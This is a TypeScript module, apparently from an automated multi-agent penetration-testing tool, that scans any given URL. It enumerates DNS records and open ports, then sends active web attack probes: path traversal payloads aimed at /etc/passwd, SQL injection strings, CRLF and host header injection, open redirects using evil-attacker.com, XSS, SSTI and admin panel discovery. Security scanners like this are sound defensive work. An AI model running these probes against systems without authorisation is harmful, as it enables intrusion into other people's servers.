import net from 'net';
import tls from 'tls';

type AgentName = 'Scout Agent' | 'Exploiter Agent' | 'Reporter Agent';
export type PentagiLogEntry = { time: string; agent: AgentName; msg: string };
type FindingEntry = { severity: 'critical' | 'high' | 'medium' | 'low'; title: string };

async function probePort(host: string, port: number, timeoutMs = 1500): Promise<boolean> {
  return new Promise((resolve) => {
    const socket = new net.Socket();
    let done = false;
    const finish = (result: boolean) => {
      if (done) return;
      done = true;
      socket.destroy();
      resolve(result);
    };
    socket.setTimeout(timeoutMs);
    socket.once('connect', () => finish(true));
    socket.once('timeout', () => finish(false));
    socket.once('error', () => finish(false));
    socket.connect(port, host);
  });
}

async function getSslCertInfo(hostname: string): Promise<{ issuer: string; expires: string; daysLeft: number } | null> {
  return new Promise((resolve) => {
    const socket = tls.connect(
      { host: hostname, port: 443, servername: hostname, rejectUnauthorized: false },
      () => {
        const cert = socket.getPeerCertificate();
        socket.destroy();
        if (cert?.valid_to) {
          const expires = new Date(cert.valid_to);
          const daysLeft = Math.floor((expires.getTime() - Date.now()) / 86400000);
          resolve({
            issuer: (cert.issuer?.O as string) || (cert.issuer?.CN as string) || 'Unknown',
            expires: expires.toISOString().split('T')[0],
            daysLeft,
          });
        } else {
          resolve(null);
        }
      }
    );
    socket.once('error', () => resolve(null));
    socket.setTimeout(5000, () => { socket.destroy(); resolve(null); });
  });
}

async function httpProbe(
  url: string,
  init: RequestInit = {},
  timeoutMs = 4000
): Promise<{ status: number; body: string; headers: Record<string, string> } | null> {
  try {
    const ctrl = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), timeoutMs);
    const res = await fetch(url, { ...init, signal: ctrl.signal });
    clearTimeout(timer);
    const body = await res.text().catch(() => '');
    const headers: Record<string, string> = {};
    res.headers.forEach((v, k) => { headers[k.toLowerCase()] = v; });
    return { status: res.status, body, headers };
  } catch {
    return null;
  }
}

export async function runPentagiExploit(url: string): Promise<PentagiLogEntry[]> {
  const logs: PentagiLogEntry[] = [];
  const findings: FindingEntry[] = [];
  const t0 = Date.now();

  const log = (agent: AgentName, msg: string) => {
    const ms = Date.now() - t0;
    const time = `${String(Math.floor(ms / 60000)).padStart(2, '0')}:${String(Math.floor((ms % 60000) / 1000)).padStart(2, '0')}`;
    logs.push({ time, agent, msg });
    console.log(`[PentAGI][${time}] ${agent}: ${msg}`);
  };

  let targetUrl = url.trim();
  if (!/^https?:\/\//i.test(targetUrl)) targetUrl = 'https://' + targetUrl;

  let parsed: URL;
  try {
    parsed = new URL(targetUrl);
  } catch {
    log('Reporter Agent', `Invalid target URL: ${url}`);
    return logs;
  }

  const hostname = parsed.hostname;
  const origin = parsed.origin;
  const isHttps = parsed.protocol === 'https:';

  // ==========================================================
  // STAGE 1: SCOUT AGENT — RECONNAISSANCE
  // ==========================================================

  log('Scout Agent', `Initiating active reconnaissance against ${targetUrl}`);

  // 1a. DNS enumeration
  try {
    const dns = await import('dns/promises');
    const [aRecs, nsRecs, mxRecs, txtRecs] = await Promise.allSettled([
      dns.resolve4(hostname),
      dns.resolveNs(hostname),
      dns.resolveMx(hostname),
      dns.resolveTxt(hostname),
    ]);

    const ip = aRecs.status === 'fulfilled' ? aRecs.value[0] : 'unresolved';
    log('Scout Agent', `DNS resolved: ${hostname} → ${ip}`);

    if (nsRecs.status === 'fulfilled' && nsRecs.value.length > 0) {
      log('Scout Agent', `Nameservers: ${nsRecs.value.slice(0, 2).join(', ')}`);
    }

    if (mxRecs.status === 'fulfilled' && mxRecs.value.length > 0) {
      log('Scout Agent', `Mail infrastructure: ${mxRecs.value[0].exchange} (priority ${mxRecs.value[0].priority})`);
    }

    if (txtRecs.status === 'fulfilled') {
      const spf = txtRecs.value.find(r => r.join('').startsWith('v=spf1'));
      if (!spf) {
        log('Scout Agent', 'No SPF record found — domain may be spoofable for phishing campaigns');
        findings.push({ severity: 'medium', title: 'Missing SPF Record (Email Spoofing Risk)' });
      } else {
        log('Scout Agent', `SPF record present: ${spf.join('').substring(0, 80)}`);
      }
      const dmarc = txtRecs.value.find(r => r.join('').startsWith('v=DMARC1'));
      if (!dmarc) {
        log('Scout Agent', 'No DMARC record — no policy enforcement for spoofed emails');
        findings.push({ severity: 'low', title: 'Missing DMARC Record' });
      }
    }
  } catch (e: any) {
    log('Scout Agent', `DNS enumeration failed: ${e.message}`);
  }

  // 1b. TCP port scan (parallel, all within ~1.5s)
  const portsToScan: Array<[number, string]> = [
    [21, 'FTP'], [22, 'SSH'], [23, 'Telnet'], [25, 'SMTP'],
    [80, 'HTTP'], [443, 'HTTPS'], [3000, 'Dev-HTTP'], [3306, 'MySQL'],
    [5432, 'PostgreSQL'], [6379, 'Redis'], [8080, 'HTTP-Alt'],
    [8443, 'HTTPS-Alt'], [8888, 'Jupyter/Dev'], [9200, 'Elasticsearch'],
    [27017, 'MongoDB'],
  ];

  log('Scout Agent', `TCP port scan: probing ${portsToScan.length} common service ports on ${hostname}...`);

  const portResults = await Promise.all(
    portsToScan.map(async ([port, service]) => ({ port, service, open: await probePort(hostname, port) }))
  );
  const openPorts = portResults.filter(r => r.open);

  if (openPorts.length > 0) {
    log('Scout Agent', `Open ports confirmed: ${openPorts.map(r => `${r.port}/${r.service}`).join(', ')}`);
    for (const { port, service } of openPorts) {
      if (port === 23) {
        log('Scout Agent', `CRITICAL: Telnet (${port}/${service}) internet-exposed — cleartext credential protocol`);
        findings.push({ severity: 'critical', title: 'Telnet Service Internet-Exposed' });
      }
      if (port === 6379) {
        log('Scout Agent', `HIGH: Redis (${port}) internet-facing — typically unauthenticated by default`);
        findings.push({ severity: 'high', title: 'Redis Exposed Without Authentication' });
      }
      if (port === 27017) {
        log('Scout Agent', `HIGH: MongoDB (${port}) internet-facing — default installs lack auth`);
        findings.push({ severity: 'high', title: 'MongoDB Exposed on Internet' });
      }
      if (port === 9200) {
        log('Scout Agent', `HIGH: Elasticsearch (${port}) reachable — unauthenticated REST API possible`);
        findings.push({ severity: 'high', title: 'Elasticsearch Exposed on Internet' });
      }
      if (port === 3306 || port === 5432) {
        log('Scout Agent', `HIGH: ${service} (${port}) internet-accessible — databases should not be publicly reachable`);
        findings.push({ severity: 'high', title: `${service} Database Port Exposed on Internet` });
      }
      if (port === 8888) {
        log('Scout Agent', `MEDIUM: Jupyter/Dev server (${port}) reachable — often runs unauthenticated`);
        findings.push({ severity: 'medium', title: 'Jupyter Notebook / Dev Server Port Exposed' });
      }
    }
  } else {
    log('Scout Agent', 'Port scan complete — no unexpected services exposed beyond standard HTTP/HTTPS');
  }

  // 1c. SSL/TLS certificate inspection
  if (isHttps) {
    const cert = await getSslCertInfo(hostname);
    if (cert) {
      if (cert.daysLeft < 0) {
        log('Scout Agent', `CRITICAL: SSL certificate EXPIRED ${Math.abs(cert.daysLeft)} days ago (${cert.expires})`);
        findings.push({ severity: 'critical', title: 'SSL Certificate Expired' });
      } else if (cert.daysLeft < 14) {
        log('Scout Agent', `HIGH: Certificate expires in ${cert.daysLeft} days on ${cert.expires}`);
        findings.push({ severity: 'high', title: 'SSL Certificate Expiring Imminently (< 14 days)' });
      } else if (cert.daysLeft < 30) {
        log('Scout Agent', `MEDIUM: Certificate expires in ${cert.daysLeft} days — renewal required soon`);
        findings.push({ severity: 'medium', title: 'SSL Certificate Expiring Soon (< 30 days)' });
      } else {
        log('Scout Agent', `TLS cert valid: issued by ${cert.issuer}, expires ${cert.expires} (${cert.daysLeft}d remaining)`);
      }
    } else {
      log('Scout Agent', 'Could not inspect TLS certificate — may be self-signed or not using port 443');
    }
  }

  // 1d. Robots.txt path disclosure
  const robotsRes = await httpProbe(`${origin}/robots.txt`);
  if (robotsRes?.status === 200) {
    const disallowed = (robotsRes.body.match(/^Disallow:\s*(.+)$/gim) || []).slice(0, 6);
    if (disallowed.length > 0) {
      log('Scout Agent', `robots.txt discloses ${disallowed.length} restricted paths: ${disallowed.join(', ')}`);
    } else {
      log('Scout Agent', 'robots.txt present — no sensitive paths disclosed');
    }
  }

  // 1e. security.txt (RFC 9116)
  const secTxtRes = await httpProbe(`${origin}/.well-known/security.txt`);
  if (secTxtRes?.status === 200 && secTxtRes.body.includes('Contact:')) {
    log('Scout Agent', 'security.txt present — responsible disclosure policy configured (RFC 9116)');
  }

  // ==========================================================
  // STAGE 2: EXPLOITER AGENT — ACTIVE EXPLOIT PROBES
  // ==========================================================

  log('Exploiter Agent', `Beginning active exploit probing against ${targetUrl}`);

  // 2a. CORS origin reflection
  const corsRes = await httpProbe(targetUrl, {
    headers: { 'Origin': 'https://evil-attacker.com', 'User-Agent': 'Mozilla/5.0' },
  });
  if (corsRes) {
    const acao = corsRes.headers['access-control-allow-origin'];
    const acac = corsRes.headers['access-control-allow-credentials'];
    if (acao === '*' || acao === 'https://evil-attacker.com') {
      const sev: FindingEntry['severity'] = acac === 'true' ? 'critical' : 'high';
      log('Exploiter Agent', `CORS misconfiguration CONFIRMED: ACAO=${acao}${acac ? `, ACAC=${acac}` : ''} — ${acac === 'true' ? 'authenticated cross-origin reads possible (session hijack)' : 'cross-origin data reads enabled'}`);
      findings.push({ severity: sev, title: `CORS Misconfiguration${acac === 'true' ? ' with Credentials (Critical)' : ''}` });
    } else {
      log('Exploiter Agent', `CORS policy: ${acao ? `restricted to ${acao}` : 'no wildcard, origin not reflected'}`);
    }
  }

  // 2b. HTTP method enumeration (PUT/DELETE)
  const optionsRes = await httpProbe(targetUrl, { method: 'OPTIONS' });
  if (optionsRes) {
    const allow = (optionsRes.headers['allow'] || optionsRes.headers['access-control-allow-methods'] || '').toUpperCase();
    if (allow.includes('PUT') || allow.includes('DELETE')) {
      log('Exploiter Agent', `Dangerous HTTP methods advertised: ${allow} — PUT/DELETE may enable unauthorized writes`);
      findings.push({ severity: 'medium', title: 'Dangerous HTTP Methods Enabled (PUT/DELETE)' });
    } else {
      log('Exploiter Agent', `HTTP methods: ${allow || 'no Allow header returned'}`);
    }
  }

  // 2c. Host header injection (password reset poisoning / cache poisoning)
  const hostInjRes = await httpProbe(targetUrl, {
    headers: { 'X-Forwarded-Host': 'evil-attacker.com', 'X-Host': 'evil-attacker.com' },
  });
  if (hostInjRes) {
    const reflected =
      hostInjRes.body.includes('evil-attacker.com') ||
      (hostInjRes.headers['location'] || '').includes('evil-attacker.com');
    if (reflected) {
      log('Exploiter Agent', 'Host header injection CONFIRMED — X-Forwarded-Host reflected in response (password reset/cache poisoning vector)');
      findings.push({ severity: 'high', title: 'Host Header Injection (Password Reset Poisoning)' });
    } else {
      log('Exploiter Agent', 'Host header injection: X-Forwarded-Host not reflected');
    }
  }

  // 2d. Open redirect probing
  const redirectParams = ['next', 'redirect', 'url', 'return', 'returnUrl', 'redir', 'goto', 'continue'];
  let redirectFound = false;
  for (const param of redirectParams) {
    const rRes = await httpProbe(`${targetUrl}?${param}=//evil-attacker.com`, { redirect: 'manual' });
    if (rRes && (rRes.headers['location'] || '').includes('evil-attacker.com')) {
      log('Exploiter Agent', `Open redirect CONFIRMED: ?${param}= → ${rRes.headers['location']}`);
      findings.push({ severity: 'medium', title: `Open Redirect via ?${param} Parameter` });
      redirectFound = true;
      break;
    }
  }
  if (!redirectFound) log('Exploiter Agent', 'Open redirect: no vulnerable redirect parameters detected');

  // 2e. CRLF injection / HTTP response splitting
  const crlfRes = await httpProbe(`${targetUrl}?q=test%0d%0aX-Injected:seclayer-probe%0d%0a`);
  if (crlfRes?.headers['x-injected']) {
    log('Exploiter Agent', 'CRLF injection CONFIRMED — injected HTTP header present in response (HTTP response splitting)');
    findings.push({ severity: 'high', title: 'CRLF Injection / HTTP Response Splitting' });
  } else {
    log('Exploiter Agent', 'CRLF injection: input appears sanitized');
  }

  // 2f. Path traversal / Local File Inclusion
  const traversalPayloads = [
    `${origin}/..%2F..%2F..%2Fetc%2Fpasswd`,
    `${origin}/%2e%2e/%2e%2e/%2e%2e/etc/passwd`,
    `${targetUrl}?file=../../../../etc/passwd`,
    `${targetUrl}?page=../../../etc/passwd`,
  ];
  let traversalFound = false;
  for (const payload of traversalPayloads) {
    const tRes = await httpProbe(payload);
    if (tRes && (tRes.body.includes('root:x:') || tRes.body.includes('/bin/bash') || tRes.body.includes('daemon:'))) {
      log('Exploiter Agent', `LFI CONFIRMED: /etc/passwd readable via ${payload}`);
      findings.push({ severity: 'critical', title: 'Local File Inclusion (LFI) — /etc/passwd Readable' });
      traversalFound = true;
      break;
    }
  }
  if (!traversalFound) log('Exploiter Agent', 'Path traversal: no LFI confirmed via common payloads');

  // 2g. GraphQL introspection
  const gqlRes = await httpProbe(`${origin}/graphql`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ query: '{__schema{types{name}}}' }),
  });
  if (gqlRes && (gqlRes.body.includes('__schema') || gqlRes.body.includes('__Type'))) {
    log('Exploiter Agent', 'GraphQL introspection ENABLED — full schema extractable without authentication');
    findings.push({ severity: 'high', title: 'GraphQL Schema Introspection Exposed' });
  } else {
    log('Exploiter Agent', gqlRes?.status === 200 ? 'GraphQL present but introspection disabled' : 'No GraphQL endpoint at /graphql');
  }

  // 2h. SQL injection (error-based)
  const sqliProbes = [
    { probe: `${targetUrl}?id='`, label: "single-quote boundary" },
    { probe: `${targetUrl}?id=1 AND 1=2 UNION SELECT NULL--`, label: "UNION-based" },
    { probe: `${targetUrl}?search=') OR ('1'='1`, label: "boolean-based" },
  ];
  let sqliFound = false;
  for (const { probe, label } of sqliProbes) {
    const sqliRes = await httpProbe(probe);
    if (sqliRes) {
      const b = sqliRes.body.toLowerCase();
      if (b.includes('syntax error') || b.includes('sql syntax') || b.includes('ora-') ||
          b.includes('mysql_fetch') || b.includes('unclosed quotation') || b.includes('unterminated quoted')) {
        log('Exploiter Agent', `SQL injection CONFIRMED via ${label} — database error reflected in HTTP response`);
        findings.push({ severity: 'critical', title: 'SQL Injection (Error-Based)' });
        sqliFound = true;
        break;
      }
    }
  }
  if (!sqliFound) log('Exploiter Agent', 'SQL injection: no error-based reflection detected');

  // 2i. Reflected XSS
  const xssTag = `<seclayer-xss-probe-${Date.now()}>`;
  const xssRes = await httpProbe(`${targetUrl}?q=${encodeURIComponent(xssTag)}&s=${encodeURIComponent(xssTag)}`);
  if (xssRes?.body.includes(xssTag)) {
    log('Exploiter Agent', 'Reflected XSS CONFIRMED — unencoded HTML tag reflected verbatim in response body');
    findings.push({ severity: 'high', title: 'Reflected Cross-Site Scripting (XSS)' });
  } else {
    log('Exploiter Agent', 'Reflected XSS: input encoded or not reflected');
  }

  // 2j. Server-Side Template Injection (SSTI)
  const sstiRes = await httpProbe(`${targetUrl}?name=${encodeURIComponent('{{7*7}}')}&q=${encodeURIComponent('${7*7}')}`);
  if (sstiRes && sstiRes.body.includes('49') && !sstiRes.body.includes('{{7*7}}')) {
    log('Exploiter Agent', 'SSTI POSSIBLE: template expression {{7*7}} evaluated to 49 in response');
    findings.push({ severity: 'critical', title: 'Server-Side Template Injection (SSTI)' });
  } else {
    log('Exploiter Agent', 'SSTI probe: expressions not evaluated');
  }

  // 2k. Common admin panel discovery
  const adminPaths = ['/admin', '/wp-admin', '/phpmyadmin', '/adminer', '/panel', '/dashboard/admin', '/_admin', '/console'];
  const adminFound: string[] = [];
  await Promise.all(adminPaths.map(async (p) => {
    const aRes = await httpProbe(`${origin}${p}`);
    if (aRes && aRes.status === 200 && aRes.body.length > 100) adminFound.push(p);
  }));
  if (adminFound.length > 0) {
    log('Exploiter Agent', `Admin panels accessible without auth: ${adminFound.join(', ')}`);
    findings.push({ severity: 'high', title: `Admin Panels Publicly Accessible: ${adminFound.join(', ')}` });
  } else {
    log('Exploiter Agent', 'Admin panel discovery: no publicly accessible panels found');
  }

  // ==========================================================
  // STAGE 3: REPORTER AGENT — COMPILE RESULTS
  // ==========================================================

  log('Reporter Agent', `Pentest session complete. Compiling ${findings.length} confirmed finding${findings.length !== 1 ? 's' : ''}...`);

  const bySev = {
    critical: findings.filter(f => f.severity === 'critical'),
    high: findings.filter(f => f.severity === 'high'),
    medium: findings.filter(f => f.severity === 'medium'),
    low: findings.filter(f => f.severity === 'low'),
  };

  if (bySev.critical.length > 0) {
    log('Reporter Agent', `[CRITICAL ×${bySev.critical.length}] ${bySev.critical.map(f => f.title).join(' | ')}`);
  }
  if (bySev.high.length > 0) {
    log('Reporter Agent', `[HIGH ×${bySev.high.length}] ${bySev.high.map(f => f.title).join(' | ')}`);
  }
  if (bySev.medium.length > 0) {
    log('Reporter Agent', `[MEDIUM ×${bySev.medium.length}] ${bySev.medium.map(f => f.title).join(' | ')}`);
  }
  if (bySev.low.length > 0) {
    log('Reporter Agent', `[LOW ×${bySev.low.length}] ${bySev.low.map(f => f.title).join(' | ')}`);
  }
  if (findings.length === 0) {
    log('Reporter Agent', 'No confirmed exploitable vulnerabilities detected. Strong baseline security posture observed.');
  }

  const riskScore = Math.max(10, 100 - bySev.critical.length * 30 - bySev.high.length * 15 - bySev.medium.length * 5 - bySev.low.length * 2);
  const riskLevel = bySev.critical.length > 0 ? 'CRITICAL' : bySev.high.length > 0 ? 'HIGH' : bySev.medium.length > 0 ? 'MEDIUM' : 'LOW';
  log('Reporter Agent', `Risk rating: ${riskLevel} | Posture score: ${riskScore}/100 | Session artifacts archived`);

  return logs;
}
